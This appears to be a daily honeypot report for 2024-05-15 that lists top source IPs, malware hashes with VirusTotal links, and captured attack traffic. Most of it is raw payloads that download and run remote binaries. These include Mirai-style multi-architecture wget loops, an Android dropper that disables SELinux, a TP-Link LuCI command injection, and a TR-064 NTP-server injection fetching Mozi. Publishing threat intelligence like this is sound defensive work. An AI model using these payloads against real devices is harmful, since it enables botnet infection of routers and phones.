@@ -1,0 +1,62 @@
+Top 5 IPs for 2024-05-15 :
+
+222.101.5.150
+110.179.121.213
+115.20.166.6
+185.229.119.159
+220.90.178.26
+
+
+Malware Observed:
+
+d964a248066719ed8d58832c72e5607dc25a7d06c9e0c1cd613ab11286e40d15
+https://www.virustotal.com/gui/file/d964a248066719ed8d58832c72e5607dc25a7d06c9e0c1cd613ab11286e40d15
+63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+https://www.virustotal.com/gui/file/63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+2e09cbc592b57e26e921c93afeec8a13f9815fff108671adf39a3ef55a261d4f
+https://www.virustotal.com/gui/file/2e09cbc592b57e26e921c93afeec8a13f9815fff108671adf39a3ef55a261d4f
+e10af5a40d9068f10dcbd9dd60a4ff61532338b1cf907eaadc501b7f210f5843
+https://www.virustotal.com/gui/file/e10af5a40d9068f10dcbd9dd60a4ff61532338b1cf907eaadc501b7f210f5843
+
+
+Commands/exploits observed:
+
+wget http://174.138.28.28:8080/cundi.arm; chmod 777 cundi.arm; ./cundi.arm kami
+wget http://174.138.28.28:8080/cundi.arm5; chmod 777 cundi.arm5; ./cundi.arm5 kami
+wget http://174.138.28.28:8080/cundi.arm6; chmod 777 cundi.arm6; ./cundi.arm6 kami
+wget http://174.138.28.28:8080/cundi.arm7; chmod 777 cundi.arm7; ./cundi.arm7 kami
+wget http://174.138.28.28:8080/cundi.m68k; chmod 777 cundi.m68k; ./cundi.m68k kami
+wget http://174.138.28.28:8080/cundi.mips; chmod 777 cundi.mips; ./cundi.mips kami
+wget http://174.138.28.28:8080/cundi.mpsl; chmod 777 cundi.mpsl; ./cundi.mpsl kami
+wget http://174.138.28.28:8080/cundi.ppc; chmod 777 cundi.ppc; ./cundi.ppc kami
+wget http://174.138.28.28:8080/cundi.sh4; chmod 777 cundi.sh4; ./cundi.sh4 kami
+wget http://174.138.28.28:8080/cundi.spc; chmod 777 cundi.spc; ./cundi.spc kami
+wget http://174.138.28.28:8080/cundi.x86; chmod 777 cundi.x86; ./cundi.x86 kami
+wget http://174.138.28.28:8080/cundi.x86_64; chmod 777 cundi.x86_64; ./cundi.x86_64 kami
+
+rm $0
+
+
+cd /data/local/tmp/; busybox wget http://174.138.28.28:8080/w.sh; sh w.sh; curl http://174.138.28.28:8080/c.sh; sh c.sh; wget http://174.138.28.28:8080/wget.sh; sh wget.sh; curl http://174.138.28.28:8080/wget.sh; sh wget.sh; busybox wget http://174.138.28.28:8080/wget.sh; sh wget.sh; busybox curl http://174.138.28.28:8080/wget.sh; sh wget.sh
+
+
+GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://14.225.204.172/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk) HTTP/1.1
+Host: 44.202.17.248:8080
+User-Agent: Go-http-client/1.1
+
+
+
+
+su 0 kill -9 $(toybox ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(surfaceflinger|system_server)/ && $2 > 15 && $1 != '$$' {print $1}');kill -9 $(toybox ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(surfaceflinger|system_server)/ && $2 > 20 && $1 != '$$' {print $1}');toybox pkill M;toybox pkill -9 arm;toybox pkill -9 arm7;toybox pkill -9 x86;toybox pkill -9 x86_64;su 0 toybox pkill M;su 0 toybox pkill -9 arm;su 0 toybox pkill -9 arm7;su 0 toybox pkill -9 x86;su 0 toybox pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;setenforce 0;busybox wget http://103.228.37.56/and || su 0 busybox wget http://103.228.37.56/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
+
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:5555
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://117.255.84.227:41262/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+
